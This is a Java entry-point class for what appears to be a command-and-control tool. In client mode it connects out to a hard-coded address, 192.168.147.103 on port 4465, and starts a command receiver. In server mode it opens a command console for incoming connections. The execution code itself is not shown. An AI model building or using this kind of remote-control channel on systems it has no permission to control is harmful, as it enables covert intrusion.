package app;

import java.io.IOException;

import app.cmdctrl.CmdClient;
import app.cmdctrl.CmdServ;
import app.config.Verbosity;
import app.socket.Config;
import app.socket.ServerSockService;
import app.socket.SockService;

public class App {
	
	private CmdServ cmdAndControl;
	private CmdClient cmdClientRecv;
	
	public static void main(String [] args) throws IOException{
		if(args.length < 1) {
			System.out.println("[*] Error, faltan parametros de ejecución.\n\t-s Server mode\n\t-c Client mode");
			return;
		}
		
		String mode = args[0];
		
		if(mode.equals("-c") || mode.equals("-s")) {
			new App()
				.bootstrap()
					.run(mode);
		}
	}
	
	public App bootstrap() {
		GlobalOpts.verboseLevel = Verbosity.VERBOSE_DEBUG;
		
		return this;
	}
	
	public void run(String mode) throws IOException {
		if(mode.equals("-c")) {
			runClientMode();
		}else if(mode.equals("-s")) {
			runServerMode();
		}
	}
	
	public void runClientMode() throws IOException{
		System.out.println("[*] Client mode running");
		
		SockService socket = new SockService();
		
		socket.getConnectionObserver()
			.filter((conn) -> conn.status.equals(SockService.CONNECTED_STATUS))
			.subscribe((conn) -> {
				if(cmdClientRecv != null) { //TODO: cerrar recursos(?)
					
				}
				cmdClientRecv = new CmdClient(socket);
				cmdClientRecv.start();
			});
		
		socket.setConfig(new Config("192.168.147.103", 4465, true, 10, true));
		socket.connect();
	}
	
	public void runServerMode() {
		System.out.println("[*] Server mode running");
		
		ServerSockService server = new ServerSockService();
		
		server.startInComingConnections();
		cmdAndControl = new CmdServ(server);
		cmdAndControl.openCmd();
		
	}
}
